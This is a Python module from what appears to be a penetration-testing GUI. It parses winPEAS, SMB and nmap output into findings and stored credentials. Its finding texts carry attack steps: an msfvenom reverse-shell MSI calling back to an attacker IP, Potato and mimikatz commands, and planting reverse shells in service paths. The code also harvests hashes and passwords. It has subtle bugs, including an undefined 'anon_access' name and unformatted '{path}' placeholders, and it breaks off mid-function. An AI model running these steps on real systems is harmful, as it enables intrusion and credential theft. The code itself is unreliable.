# HAWK — Hostile Assessment WorKit
# Copyright 2026 Lorenzo Serafini
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# A copy of the License is provided in the LICENSE file at the root
# of this distribution, or at http://www.apache.org/licenses/LICENSE-2.0
#
# Attribution "Created by Lorenzo Serafini" must be preserved in all
# redistributed and Derivative Works — see NOTICE for details.

"""
HAWK - Kill Chain Card Widget v1.0
- Port-aware routing for all tools
- Hydra: wordlist dropdown from metasploit/seclists + browse
- MSF card: check DB + guide user
- Nmap custom: free command field
- Right-click context menu on all entries
- smbclient/crackmapexec → auto-populate intel
- ssh_banner/ftp_anon port-aware fix
- No popup for 0 ports found
- WinRM excluded from HTTP tools
"""

import customtkinter as ctk
import tkinter as tk
import os
import re
import glob
import time
import subprocess
import threading
import shlex
import json
import zipfile
import tempfile
import shutil
import socket
import random
import string
import uuid
from datetime import datetime
from pathlib import Path

from utils.runner import ToolRunner, MultiRunner, MetasploitRunner, GreenBoneRunner
from utils.session import Credential
from gui.widgets.card_common import *

class CardPostParserMixin:
    def _parse_winpeas_output(self, tool, log: list):
        """Parse winpeas.bat/exe exfiltrated output and push findings to
        Target Intel (privesc vectors) and Credential Store (hashes/passwords).

        Called from _on_tool_done when tool.id in ('winpeas','winpeas_exe',
        'privesc_check') and the exfiltrated file is opened via Step 5.
        Can also be called manually by the user via the PARSE button in the
        workflow dialog.
        """
        import re
        if not hasattr(self.app, "target_intel") or not log:
            return

        target = self._get_target() or "target"
        text = "\n".join(l for _, l in log)

        # Strip ANSI color codes — winpeas.exe uses them heavily
        ansi_escape = re.compile(r'\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])')
        text = ansi_escape.sub("", text)
        lines = text.splitlines()

        findings = []
        creds_to_push = []

        # ── NTLM / SAM hashes ────────────────────────────────────────────────
        # Format: username:RID:LM_hash:NTLM_hash:::
        hash_pattern = re.compile(
            r'^([^:]+):(\d+):([a-fA-F0-9]{32}):([a-fA-F0-9]{32}):::')
        for line in lines:
            m = hash_pattern.match(line.strip())
            if m:
                user, rid, lm, ntlm = m.group(1), m.group(2), m.group(3), m.group(4)
                if user.lower() not in ("", "guest") and ntlm != "31d6cfe0d16ae931b73c59d7e0c089c0":
                    creds_to_push.append({
                        "username": user, "password": "", "hash": f"{lm}:{ntlm}",
                        "hash_type": "NTLM", "service": "SAM",
                        "source": f"winpeas@{target}"})

        # ── Cleartext passwords in files/registry ────────────────────────────
        pw_patterns = [
            re.compile(r'(?:password|passwd|pwd)\s*[=:]\s*(.+)', re.I),
            re.compile(r'(?:connectionString|Connection String).*?password=([^;"\s]+)', re.I),
            re.compile(r'DefaultPassword\s+REG_SZ\s+(.+)', re.I),
        ]
        for line in lines:
            for pat in pw_patterns:
                m = pat.search(line)
                if m:
                    pw = m.group(1).strip().strip('"\'')
                    if pw and len(pw) > 2 and pw.lower() not in ("", "*", "none", "null", "<blank>"):
                        # Try to find username context in nearby lines
                        creds_to_push.append({
                            "username": "", "password": pw, "hash": "",
                            "hash_type": "", "service": "cleartext",
                            "source": f"winpeas@{target}",
                            "note": line.strip()[:120]})
                    break

        # ── SeImpersonatePrivilege / Potato ──────────────────────────────────
        if re.search(r'SeImpersonatePrivilege.*Enabled', text, re.I):
            findings.append({
                "title": f"SeImpersonatePrivilege Enabled — {target}",
                "description": (
                    "SeImpersonatePrivilege is enabled for the current user.\n\n"
                    "IMPACT: This allows impersonating any user token, including SYSTEM.\n\n"
                    "EXPLOIT PATH — Potato attacks:\n"
                    "  1. GodPotato (Windows 8/2012+):\n"
                    "     GodPotato.exe -cmd \"cmd /c whoami\"\n"
                    "  2. PrintSpoofer (Windows 10/Server 2019):\n"
                    "     PrintSpoofer.exe -i -c cmd\n"
                    "  3. JuicyPotato (legacy, Windows 7/2008/2012):\n"
                    "     JuicyPotato.exe -l 9999 -p cmd.exe -t * -c {CLSID}\n\n"
                    "Transfer the binary via certutil/iwr, execute in current shell.\n"
                    "Source: winpeas token privileges check"
                ),
                "severity": "critical", "source": "winpeas"})

        if re.search(r'SeDebugPrivilege.*Enabled', text, re.I):
            findings.append({
                "title": f"SeDebugPrivilege Enabled — {target}",
                "description": (
                    "SeDebugPrivilege is enabled — can read/write any process memory including SYSTEM processes.\n\n"
                    "EXPLOIT: Inject into lsass.exe to dump credentials, or migrate a meterpreter session into a SYSTEM process:\n"
                    "  meterpreter> migrate <SYSTEM_PID>\n"
                    "Or use mimikatz: privilege::debug  then  sekurlsa::logonpasswords"
                ),
                "severity": "high", "source": "winpeas"})

        # ── AlwaysInstallElevated ─────────────────────────────────────────────
        if re.search(r'AlwaysInstallElevated.*(0x1|1)', text, re.I):
            findings.append({
                "title": f"AlwaysInstallElevated Enabled — {target}",
                "description": (
                    "AlwaysInstallElevated is set to 1 in both HKLM and HKCU.\n\n"
                    "IMPACT: Any MSI file is installed with SYSTEM privileges, regardless of user rights.\n\n"
                    "EXPLOIT:\n"
                    "  1. On Kali: msfvenom -p windows/shell_reverse_tcp "
                    "LHOST=<IP> LPORT=4444 -f msi -o evil.msi\n"
                    "  2. Transfer evil.msi to target\n"
                    "  3. On target: msiexec /quiet /qn /i C:\\Windows\\Temp\\evil.msi\n"
                    "  Result: SYSTEM reverse shell connects back to Kali nc -lvnp 4444"
                ),
                "severity": "critical", "source": "winpeas"})

        # ── Unquoted service paths ────────────────────────────────────────────
        unquoted = re.findall(
            r'Unquoted.*?:\s*(C:\\[^"\n]+\s[^"\n]+\.exe)', text, re.I)
        if not unquoted:
            unquoted = re.findall(
                r'\[!\]\s*(C:\\[^"\n]+\s[^"\n]+\.exe)', text, re.I)
        for path in unquoted[:5]:  # cap at 5
            parts = path.split("\\")
            hijack_candidates = []
            for i in range(1, len(parts)):
                seg = "\\".join(parts[:i])
                if " " in parts[i-1] if i > 0 else False:
                    hijack_candidates.append(seg + ".exe")
            findings.append({
                "title": f"Unquoted Service Path — {target}",
                "description": (
                    f"Service binary path is unquoted and contains spaces:\n  {path}\n\n"
                    "IMPACT: Windows tries alternative paths with spaces. "
                    "If any parent directory is writable, you can plant a binary.\n\n"
                    f"Candidates to try (place your reverse shell at these paths):\n"
                    + "\n".join(f"  {c}" for c in hijack_candidates) +
                    "\n\nThen restart the service: sc stop <svc> && sc start <svc>\n"
                    "Or wait for system reboot if you can't restart the service."
                ),
                "severity": "high", "source": "winpeas"})

        # ── Modifiable service binaries ───────────────────────────────────────
        mod_bins = re.findall(
            r'\[!\].*?modifiable.*?:\s*(C:\\[^\n]+\.exe)', text, re.I)
        for path in mod_bins[:3]:
            findings.append({
                "title": f"Writable Service Binary — {target}",
                "description": (
                    f"Service binary is writable by current user:\n  {path}\n\n"
                    "IMPACT: Replace the binary with a reverse shell, then restart the service to get SYSTEM.\n\n"
                    "EXPLOIT:\n"
                    "  1. Backup: copy \"{path}\" \"{path}.bak\"\n"
                    "  2. Replace: copy evil.exe \"{path}\"\n"
                    "  3. Restart service or wait for reboot\n"
                    "  4. Restore: copy \"{path}.bak\" \"{path}\""
                ),
                "severity": "high", "source": "winpeas"})

        # ── Credential Manager entries ────────────────────────────────────────
        cmdkey_entries = re.findall(r'cmdkey.*?Target:\s*(.+?)(?:\n|User:|$)', text, re.I)
        if cmdkey_entries or re.search(r'Found credentials in Credential Manager', text, re.I):
            findings.append({
                "title": f"Saved Credentials (Credential Manager) — {target}",
                "description": (
                    "Windows Credential Manager has saved credentials.\n\n"
                    "Saved entries:\n" +
                    "\n".join(f"  {e.strip()}" for e in cmdkey_entries[:5]) +
                    "\n\nEXPLOIT: Use runas with saved credentials:\n"
                    "  runas /savecred /user:<domain>\\<user> cmd.exe\n"
                    "Or dump with mimikatz:\n"
                    "  sekurlsa::credman"
                ),
                "severity": "high", "source": "winpeas"})

        # ── Push findings to Target Intel ─────────────────────────────────────
        if findings or creds_to_push:
            try:
                run_id = f"winpeas_{target}_{id(self)}"
                for f in findings:
                    f["linked_run_id"] = run_id
                    f["_fresh"] = True
                    f["_update_note"] = "NEW"
                self.app.target_intel.add_auto_findings(findings)

                # Push credentials
                if creds_to_push:
                    sess = self.app.session_manager.current
                    if sess:
                        from utils.session import Credential
                        for c in creds_to_push:
                            try:
                                cred = Credential(
                                    username=c.get("username",""),
                                    password=c.get("password",""),
                                    hash_value=c.get("hash",""),
                                    hash_type=c.get("hash_type",""),
                                    service=c.get("service",""),
                                    host=target,
                                    source=c.get("source","winpeas"),
                                    linked_run_id=run_id,
                                )
                                sess.add_credential(cred)
                            except Exception as ce:
                                print(f"[HAWK] winpeas cred push failed: {ce}")
                        sess.save()
                        if hasattr(self.app, "credential_store"):
                            self.app.credential_store.refresh()

                # Summary in terminal
                self.app.terminal.write(
                    f"  [+] winpeas parsed: {len(findings)} privesc findings, "
                    f"{len(creds_to_push)} credentials → Target Intel + Credential Store",
                    "success")
                if findings:
                    critical = [f for f in findings if f.get("severity") == "critical"]
                    high = [f for f in findings if f.get("severity") == "high"]
                    if critical:
                        self.app.terminal.write(
                            f"  [!!!] CRITICAL: {', '.join(f['title'].split('—')[0].strip() for f in critical)}",
                            "error")
                    if high:
                        self.app.terminal.write(
                            f"  [!] HIGH: {', '.join(f['title'].split('—')[0].strip() for f in high)}",
                            "warn")
            except Exception as e:
                print(f"[HAWK] winpeas parser push failed: {e}")
        else:
            self.app.terminal.write(
                "  [i] winpeas parsed — no automatic privesc findings detected. "
                "Review the full output manually (Step 5 → OPEN RESULT).", "info")

    def _parse_smb_output(self, tool, log: list):
        """Parse smbclient / netexec output → Target Intel + push used
        creds to the Credential Store when appropriate.

        Previously this parser over-flagged "SMB Anonymous Login
        Allowed" on ANY run that contained the substring " READ" in
        a line (NetExec share-table format trigger), even when the
        user had explicitly run smbclient with -U user%pass AND the
        connection failed (NT_STATUS_RESOURCE_NAME_NOT_FOUND).  It
        also never harvested successful authenticated credentials
        into the Credential Store — the user had to re-type them.

        New flow:
          1. Short-circuit on connect failures — no finding when the
             tool never reached auth (name resolution, port closed,
             TCP reset, SMB negotiate failure).
          2. Inspect the cmd line to tell anonymous from authenticated:
             `-N` or no -U → anonymous; `-U 'user%pass'` or equivalent
             → authenticated.
          3. Detect successful auth by share-list presence OR the
             explicit "Anonymous login successful" marker (smbclient)
             / NetExec's "Pwn3d!" marker.
          4. Authenticated + successful → harvest user/pass from the
             cmd and push to the Credential Store (dedup inside
             add_credential).
          5. Anonymous + successful → surface the classic "SMB
             Anonymous Login Allowed" finding.
          6. Either way, list discovered shares and the one-shot
             access commands.
        """
        import re
        from utils.session import Credential

        target = self._get_target() or "target"
        text = "\n".join(self._strip_ansi(l) for _, l in log).lower()
        cmd = ((self._tool_widgets.get(tool.id) or {})
                .get("_last_cmd", "")) or ""

        # ── Step 1: short-circuit on connection / auth failure ─────
        # These markers appear on smbclient / NetExec when the tool
        # never completed authentication successfully.  We log the
        # failure context to the terminal but skip the "allowed"
        # finding — the user's screenshot showed NT_STATUS_RESOURCE_
        # NAME_NOT_FOUND triggering a false-positive anon-login
        # finding.  Guard against that.
        _FAIL_MARKERS = (
            "nt_status_resource_name_not_found",
            "nt_status_logon_failure",
            "nt_status_access_denied",
            "nt_status_account_locked_out",
            "nt_status_account_disabled",
            "nt_status_password_expired",
            "nt_status_wrong_password",
            "do_connect: connection to",
            "connection refused",
            "connection timed out",
            "connection reset",
            "no route to host",
            "protocol negotiation failed",
            "smb1 is disabled",
        )
        connect_failed = any(m in text for m in _FAIL_MARKERS)

        # ── Step 2: detect auth mode from the cmd line ─────────────
        # Accept multiple quote flavours: -U 'admin%pass', -U admin%pass,
        # -U "CORP\\admin%pass", etc.  Also handle NetExec's positional
        # "-u admin -p pass" form.
        cmd_low = cmd.lower()
        anon_cmd = (" -n" in " " + cmd_low + " ")   # smbclient -N
        auth_user = ""
        auth_pass = ""

        # smbclient -U style  (single cred packed into one arg).
        mU = re.search(
            r"-U\s+['\"]?([^'\"%\s]+(?:\\[^'\"%\s]+)?)%"
            r"([^'\"]*?)['\"]?(?:\s|$)", cmd)
        if mU:
            auth_user = mU.group(1)
            auth_pass = mU.group(2)

        # netexec -u USER -p PASS style.
        if not auth_user:
            mu = re.search(r"\s-u\s+(?:\"([^\"]+)\"|'([^']+)'|(\S+))",
                            cmd)
            mp = re.search(r"\s-p\s+(?:\"([^\"]*)\"|'([^']*)'|(\S+))",
                            cmd)
            if mu:
                auth_user = next(
                    g for g in mu.groups() if g is not None)
            if mp:
                auth_pass = next(
                    (g for g in mp.groups() if g is not None), "")

        is_authenticated = bool(auth_user)

        # ── Step 3: share parsing ──────────────────────────────────
        shares = []
        anon_success = False
        pwn3d = False
        for level, raw in log:
            line = self._strip_ansi(raw)
            low = line.lower()
            if "anonymous login successful" in low:
                anon_success = True
            if "pwn3d!" in low or "(pwn3d!)" in low:
                pwn3d = True

            # smbclient -L table:   "ADMIN$  Disk  Remote Admin"
            m = re.search(
                r"^\s*([\w\$\-\.]+)\s+(Disk|IPC|Printer)\b\s*(.*)$",
                line, re.I)
            if m:
                share = m.group(1).strip()
                stype = m.group(2)
                shares.append((share, stype))
                continue

            # NetExec table:  "SMB  <ip> 445  <host>   ADMIN$  READ,WRITE  ..."
            # Require the SMB prefix so we don't match random "READ"
            # substrings in error messages / help text.
            m2 = re.search(
                r"^\s*SMBv?\d?\s+\S+\s+\d+\s+\S+\s+"
                r"([\w\$\-\.]+)\s+(READ|WRITE|NO\s+ACCESS)",
                line, re.I)
            if m2:
                share_name = m2.group(1)
                if share_name.lower() not in ("", "sharename"):
                    shares.append((share_name, "Disk"))

        # Connection failure always wins — even when smbclient manages to
        # output a partial share table (e.g. IPC$ from a half-completed
        # negotiate) before the error fires, the NT_STATUS_* error means
        # the auth/session was never established.  We must not surface a
        # "SMB Authenticated Access" finding for a connection that failed.
        # Previous guard checked `not shares` which let IPC$-only results
        # through and produced false-positive findings.
        if connect_failed:
            self.app.terminal.write(
                "  [i] SMB: connection / auth failed — no shares "
                "enumerated, no finding added.", "dim")
            return

        # ── Step 4a: authenticated run + success → push cred to store
        pushed_cred = False
        if is_authenticated and (shares or pwn3d) and not connect_failed:
            try:
                sess = self.app.session_manager.current
                if sess is not None:
                    # Extract domain from "DOMAIN\user" form if present.
                    domain = ""
                    uname = auth_user
                    if "\\" in uname:
                        domain, uname = uname.split("\\", 1)
                    cred = Credential(
                        username=uname,
                        password=auth_pass,
                        cred_type="cleartext",
                        services=["SMB"],
                        source_phase=self.phase_id,
                        host=target,
                        notes=(f"Verified via {tool.name} on "
                               f"{target}"
                               + (f" (domain: {domain})"
                                  if domain else "")
                               + f" — {len(shares)} share(s) "
                                 f"listed."))
                    sess.add_credential(cred)
                    pushed_cred = True
                    cs = getattr(self.app, "cred_store", None)
                    if cs and hasattr(cs, "_render_creds"):
                        cs._render_creds()
                    self.app.terminal.write(
                        f"  [+] {tool.name}: credential "
                        f"{uname}:{'*' * len(auth_pass)} confirmed "
                        f"on {target} → pushed to Credential Store.",
                        "success")
            except Exception as e:
                print(f"[HAWK] smb cred push failed: {e}")

        # ── Step 4b: anonymous run + success → anon cred placeholder
        if not is_authenticated and (anon_success or shares) \
                and not connect_failed:
            try:
                sess = self.app.session_manager.current
                if sess is not None:
                    sess.add_credential(Credential(
                        username="anonymous",
                        password="",
                        cred_type="cleartext",
                        services=["SMB"],
                        source_phase=self.phase_id,
                        host=target,
                        notes=(f"SMB anonymous access confirmed by "
                               f"{tool.name} on {target}.")))
                    cs = getattr(self.app, "cred_store", None)
                    if cs and hasattr(cs, "_render_creds"):
                        cs._render_creds()
            except Exception as e:
                print(f"[HAWK] smb anon cred push failed: {e}")

        # ── Step 5: Target Intel finding ───────────────────────────
        if not hasattr(self.app, "target_intel"):
            return
        share_list = "\n".join(
            f"  {s} ({t})" for s, t in shares[:10])

        if is_authenticated and (shares or pwn3d):
            # Authenticated successful access.
            desc_lines = [
                f"Authenticated SMB access confirmed on {target}.",
                f"",
                f"  User   : {auth_user}",
                f"  Shares : {len(shares)}",
            ]
            if pwn3d:
                desc_lines.append(
                    "  Local admin (Pwn3d!) → SYSTEM shell via "
                    "psexec/wmiexec/secretsdump is possible.")
            if share_list:
                desc_lines += ["", "Shares:", share_list]
            if pushed_cred:
                desc_lines += ["",
                               f"→ Credential saved to Credential "
                               f"Store (host={target}, SMB)."]
            title = (f"SMB Authenticated Access — {auth_user}@{target}"
                     + ("  (LOCAL ADMIN)" if pwn3d else ""))
            self.app.target_intel.add_auto_finding(
                title=title,
                description="\n".join(desc_lines),
                severity="high" if pwn3d else "medium",
                source=tool.name)
            return

        if (not is_authenticated) and (anon_success or shares):
            access_cmds = "\n".join(
                f"  smbclient //{target}/{s} -N" for s, _ in shares[:5])
            desc = f"SMB anonymous access on {target}.\n"
            if share_list:
                desc += f"\nShares:\n{share_list}"
            if access_cmds:
                desc += f"\n\nAccess commands:\n{access_cmds}"
            self.app.target_intel.add_auto_finding(
                title="SMB Anonymous Login Allowed",
                description=desc,
                severity="high",
                source=tool.name)

            # Auto-seed the Credential Store with an "anonymous" SMB entry so
            # the user can see/trace the finding alongside real creds and
            # re-use the connect-command hint.
            if anon_access and hasattr(self.app, "cred_store"):
                try:
                    # De-dupe is handled by cred_store.add_credential via
                    # _is_duplicate (matches on username + host + password).
                    # A previous custom check here ignored the password,
                    # which blocked upgrading legacy password="" entries.
                    if True:
                        # Pick the best concrete share to suggest in the
                        # connect command (prefer readable ones over IPC$).
                        pref_order = ("C$", "ADMIN$", "Users", "Public",
                                      "Documents", "Shared", "Share", "tmp")
                        share_names = [s for s, _ in shares]
                        chosen_share = ""
                        for p in pref_order:
                            for s in share_names:
                                if s.lower() == p.lower():
                                    chosen_share = s
                                    break
                            if chosen_share:
                                break
                        if not chosen_share:
                            # Fall back to the first non-IPC$ share, or just
                            # the first one, or a generic placeholder.
                            non_ipc = [s for s in share_names
                                       if s.upper() != "IPC$"]
                            chosen_share = (non_ipc[0] if non_ipc
                                            else (share_names[0]
                                                  if share_names else ""))

                        if chosen_share:
                            connect_cmd = (f"smbclient //{target}/"
                                           f"{chosen_share} -N")
                        else:
                            connect_cmd = f"smbclient -L //{target} -N"

                        note_lines = [
                            f"Anonymous SMB login found on {target}",
                            f"Connect:  {connect_cmd}",
                        ]
                        if share_names:
                            shown = ", ".join(share_names[:6])
                            if len(share_names) > 6:
                                shown += ", ..."
                            note_lines.append(f"Shares:   {shown}")

                        # SMB anonymous accepts any password (including empty)
                        # but storing "anonymous" makes the edit dialog
                        # non-empty and matches the FTP-style convention
                        # pentesters expect to see.
                        cred = Credential(
                            username="anonymous",
                            password="anonymous",
                            cred_type="cleartext",
                            services=["SMB"],
                            source_phase=self.phase_id,
                            host=target,
                            notes="\n".join(note_lines),
                        )
                        self.app.cred_store.add_credential(cred)
                        self.app.terminal.write(
                            f"  [+] Anonymous SMB login found on {target} "
                            "— added to Credential Store.", "success")
                        self.app.terminal.write(
                            f"      Connect:  {connect_cmd}", "dim")
                except Exception as e:
                    self.app.terminal.write(
                        f"  [!] anon-SMB cred auto-add failed: {e}", "error")

    def _explain_no_open_ports(self, raw_log: list):
        """Write a situation-aware diagnostic when nmap returns 0 open ports.

        The previous message listed 'host down' as a possibility even when
        the user had already confirmed the host is up (ping, -Pn). This is
        misleading — we now read nmap's own output to figure out whether:

          • nmap thinks the host is up or down,
          • all ports came back 'filtered' (firewall swallowing SYNs),
          • the scan actually completed,
          • the user used flags that frequently cause silent failures
            (-f fragmentation, --script vuln timing out on big ranges).

        Then we print targeted follow-up suggestions instead of the old
        generic three-liner.
        """
        joined = "\n".join(raw_log)
        low    = joined.lower()

        host_up_claim    = "host is up" in low
        host_down_claim  = ("host seems down" in low or
                            "note: host seems down" in low)
        scan_completed   = "nmap done" in low
        has_filtered     = bool(
            __import__("re").search(
                r"^\s*\d+/(tcp|udp)\s+filtered\b", joined,
                flags=__import__("re").MULTILINE))
        all_filtered_msg = ("all 1000 scanned ports" in low or
                            "all 65535 scanned ports" in low)
        used_pn          = ("-pn" in low or host_up_claim)
        used_fragment    = False
        for line in raw_log[:5]:  # nmap command preamble
            if " -f " in f" {line.lower()} " or line.lower().endswith(" -f"):
                used_fragment = True
                break
        aborted = any(
            k in low for k in (
                "quitting.", "giving up on port",
                "host_timeout", "qscan", "dropped",
                "connection refused", "socket error"))

        self.app.terminal.write(
            "  [*] No open ports in the scanned range.", "dim")

        # 1) Scan actually finished — what does nmap say?
        if scan_completed:
            if host_down_claim and not used_pn:
                self.app.terminal.write(
                    "  [*] nmap marks the host as DOWN (no ICMP/ACK reply).\n"
                    "      Retry with -Pn to skip host discovery, or verify\n"
                    "      reachability with: ping, arping, traceroute.",
                    "dim")
                return
            if has_filtered or all_filtered_msg:
                self.app.terminal.write(
                    "  [*] Ports returned FILTERED — a firewall is silently\n"
                    "      dropping probes on the scanned range. The host\n"
                    "      itself IS responding (ICMP/ACK got through).",
                    "dim")
                self.app.terminal.write(
                    "  [*] Try:\n"
                    "        • nmap -sS -T4 --top-ports 2000 (slower probe)\n"
                    "        • nmap -sA    (ACK scan — reveals stateful FW)\n"
                    "        • nmap -sU --top-ports 50 (UDP often unfiltered)\n"
                    "        • --source-port 53 / 88 (some FWs whitelist DNS)",
                    "dim")
                return
            if host_up_claim:
                self.app.terminal.write(
                    "  [*] Host responded but no TCP ports in the scanned set\n"
                    "      were open. Likely services are on non-standard\n"
                    "      ports or outside the range.",
                    "dim")
                if used_fragment:
                    self.app.terminal.write(
                        "  [!] Your command included -f (packet fragmentation).\n"
                        "      Modern firewalls / IDS reassemble or drop these\n"
                        "      silently. Try the same scan WITHOUT -f before\n"
                        "      concluding the host is empty.",
                        "warn")
                self.app.terminal.write(
                    "  [*] Next steps:\n"
                    "        • Full sweep: nmap -Pn -p- -T4 -sV <ip>\n"
                    "        • Wider UDP: nmap -sU --top-ports 50 <ip>\n"
                    "        • Service probe: nmap -sV -sC -p<ports> <ip>",
                    "dim")
                return
            # Scan finished, no host up/down claim, no filtered hints — rare.
            self.app.terminal.write(
                "  [*] nmap finished cleanly but emitted no port table.\n"
                "      This is unusual — check the raw output above for\n"
                "      WARNING / RTTVAR lines.",
                "dim")
            return

        # 2) Scan did NOT finish — aborted or truncated.
        if aborted:
            self.app.terminal.write(
                "  [!] nmap aborted or timed out before completing.",
                "warn")
            self.app.terminal.write(
                "  [*] Heavy flags like --script vuln combined with -p-\n"
                "      routinely hang. Run them in two passes:\n"
                "        1) nmap -Pn -T4 -p- <ip>       # just discovery\n"
                "        2) nmap -sV -sC --script vuln -p<open_ports> <ip>\n"
                "           (only on the ports that came back open)",
                "dim")
            if used_fragment:
                self.app.terminal.write(
                    "  [!] -f (fragmentation) multiplies per-port time.\n"
                    "      Drop it unless you're specifically evading IDS.",
                    "warn")
            return

        # 3) Fallback — scan completion unclear.
        self.app.terminal.write(
            "  [*] Scan output was incomplete (no 'Nmap done' marker).\n"
            "      If the host pings OK, try a simpler command first:\n"
            "        nmap -Pn -T4 --top-ports 100 <ip>",
            "dim")

    def _check_cleartext_protocols(self, raw_log: list):
        """When nmap finds FTP, Telnet, or other cleartext protocols open,
        push a PCAP analysis hint to Target Intel with a Wireshark tutorial."""
        import re
        target = self._get_target() or "target"

        CLEARTEXT_SVCS = {
            "ftp": {
                "port_default": 21,
                "name": "FTP",
                "desc": "File Transfer Protocol",
                "filter": "ftp",
                "cred_filter": "ftp.request.command == USER || ftp.request.command == PASS",
                "what": (
                    "FTP sends usernames and passwords in PLAINTEXT. "
                    "If anyone on the network is using FTP, you can see "
                    "their credentials by capturing network traffic."),
            },
            "telnet": {
                "port_default": 23,
                "name": "Telnet",
                "desc": "Telnet Remote Shell",
                "filter": "telnet",
                "cred_filter": "telnet",
                "what": (
                    "Telnet sends EVERYTHING in plaintext — usernames, "
                    "passwords, and all commands typed. If anyone is using "
                    "telnet on this network, you can read their entire session."),
            },
            "pop3": {
                "port_default": 110,
                "name": "POP3",
                "desc": "Post Office Protocol (email)",
                "filter": "pop",
                "cred_filter": "pop.request.command == USER || pop.request.command == PASS",
                "what": (
                    "POP3 (port 110) sends email credentials in plaintext. "
                    "If users check email via POP3, their passwords are visible."),
            },
            "imap": {
                "port_default": 143,
                "name": "IMAP",
                "desc": "Internet Message Access Protocol (email)",
                "filter": "imap",
                "cred_filter": "imap.request contains \"LOGIN\"",
                "what": (
                    "IMAP (port 143) can send login credentials in plaintext. "
                    "Email passwords may be visible in captured traffic."),
            },
            "smtp": {
                "port_default": 25,
                "name": "SMTP",
                "desc": "Simple Mail Transfer Protocol",
                "filter": "smtp",
                "cred_filter": "smtp.req.command == \"AUTH\"",
                "what": (
                    "SMTP without TLS sends email content and sometimes "
                    "authentication credentials in cleartext."),
            },
        }

        found = []
        for line in raw_log:
            m = re.search(
                r"^\s*(\d+)/(tcp|udp)\s+open\s+(\S+)", line, re.I)
            if not m:
                continue
            port = int(m.group(1))
            svc = m.group(3).lower()
            for key, info in CLEARTEXT_SVCS.items():
                if key in svc or port == info["port_default"]:
                    found.append({**info, "port": port})
                    break

        if not found:
            return

        parts = []
        parts.append(
            f"⚠ {len(found)} CLEARTEXT PROTOCOL(S) DETECTED\n")
        parts.append(
            "WHAT DOES THIS MEAN?\n"
            "  These services send data WITHOUT encryption. Anyone who "
            "can capture network traffic (PCAP) can read usernames, "
            "passwords, files, and commands in plain text.\n\n"
            "  In a pentest/CTF, if you find a .pcap or .pcapng file, "
            "or if you can sniff traffic (tcpdump, Wireshark), look "
            "for credentials from these protocols.\n")

        for svc in found:
            parts.append(f"{'─' * 60}")
            parts.append(
                f"  {svc['name']} on port {svc['port']}\n"
                f"  {svc['what']}\n")

        parts.append(f"{'─' * 60}")
        parts.append(
            "HOW TO ANALYZE A PCAP FILE (step by step):\n\n"
            "  1. OPEN THE PCAP IN WIRESHARK:\n"
            "       wireshark capture.pcap\n"
            "     Or from command line:\n"
            "       tshark -r capture.pcap\n\n"
            "  2. FILTER FOR CLEARTEXT PROTOCOLS:\n"
            "     In the Wireshark filter bar, type:")
        filters = list({s["filter"] for s in found})
        parts.append(
            f"       {' || '.join(filters)}\n"
            "     Press Enter — this shows ONLY the relevant packets.\n\n"
            "  3. FOLLOW THE TCP STREAM (the easy way):\n"
            "     • Right-click any packet → Follow → TCP Stream\n"
            "     • A window opens showing the ENTIRE conversation\n"
            "       in readable text — including credentials!\n"
            "     • Blue text = client (victim), Red text = server\n"
            "     • Look for USER, PASS, LOGIN lines\n\n"
            "  4. EXTRACT CREDENTIALS DIRECTLY:\n"
            "     In Wireshark filter bar, try these specific filters:")
        for svc in found:
            parts.append(f"       {svc['cred_filter']}")
        parts.append(
            "\n  5. COMMAND-LINE ALTERNATIVE (no GUI needed):\n"
            "     # Show all TCP streams with credentials:\n")
        for svc in found:
            parts.append(
                f"       tshark -r capture.pcap -Y '{svc['filter']}' -T fields "
                f"-e {svc['filter']}.request.command -e {svc['filter']}.request.arg")
        parts.append(
            "\n     # Follow a specific TCP stream:\n"
            "       tshark -r capture.pcap -z 'follow,tcp,ascii,0'\n"
            "     Change the 0 to 1, 2, 3... to see different conversations.\n\n"
            "  6. WHAT TO DO WITH FOUND CREDENTIALS:\n"
            "     • Try them on OTHER services (SSH, web login, SMB)\n"
            "       — people reuse passwords!\n"
            "     • Add them to HAWK's Credential Store for tracking\n"
            "     • Try variations: same password with admin/root username"
        )

        desc = "\n".join(parts)
        title = (
            f"Cleartext Protocols — {len(found)} on {target} "
            f"(PCAP analysis opportunity)")

        self.app.after(0, lambda: self.app.target_intel.add_auto_finding(
            title=title, description=desc,
            severity="medium", source="nmap"))
        self.app.terminal.write(
            f"  [!] {len(found)} cleartext protocol(s) detected — "
            f"see Target Intel for PCAP analysis guide.", "warn")

    def _explain_common_errors(self, tool, returncode: int, log: list):
        """Print friendly explanations for common failure signatures.

        Runs on every non-zero exit so the user understands *why* the tool
        failed without having to decode impacket/nmap/metasploit stderr.
        Keeps output in the terminal widget — no dialogs, no toast.
        """
        joined = "\n".join(line for _, line in (log or [])).lower()

        # ── Python dependency hell (cross-tool) ───────────────────────
        # Catches the class of failures that hit everyone on Python 3.12+
        # with apt-packaged Python tooling.  These are environment bugs,
        # not tool bugs — the user needs a one-click remediation dialog,
        # not a log line they'll scroll past.
        #
        # TEMPORARILY DISABLED FOR impacket-* AND netexec / nxc / cme /
        # crackmapexec.  The user fixed their local env manually
        # (distutils shim + pip impacket 0.13 + user-site purge + nxc
        # DB reset) and wants to test HAWK without the dialog auto-
        # popping up.  Re-enable by removing the binary blacklist
        # below once the env is stable.
        _DIALOG_SKIP = {
            "impacket-psexec", "impacket-secretsdump",
            "impacket-GetNPUsers", "impacket-GetUserSPNs",
            "impacket-smbclient", "impacket-smbserver",
            "impacket-wmiexec", "impacket-atexec",
            "impacket-dcomexec", "impacket-lookupsid",
            "impacket-samrdump", "impacket-rpcdump",
            "impacket-ntlmrelayx", "impacket-goldenPac",
            "impacket-ticketer", "impacket-Get-GPPPassword",
            "impacket-mssqlclient", "impacket-rbcd",
            "impacket-findDelegation", "impacket-addcomputer",
            "netexec", "nxc", "crackmapexec", "cme",
        }
        if (tool.binary or "") in _DIALOG_SKIP:
            py_dep_issue = None
        else:
            py_dep_issue = self._detect_python_dep_issue(tool, joined)
        if py_dep_issue:
            self._show_python_dep_dialog(tool, py_dep_issue, joined)
            return  # don't follow up with per-tool advice — this is the
                     # root cause, not the symptom

        # ── ldapsearch ────────────────────────────────────────────────
        if tool.binary == "ldapsearch":
            if returncode == 255:
                self.app.terminal.write(
                    "  → ldapsearch 255 = 'can't contact LDAP server'.\n"
                    "    The DC refused the TCP 389 connection. Check:\n"
                    "      • Is 389/tcp actually open? (nmap -p 389 <target>)\n"
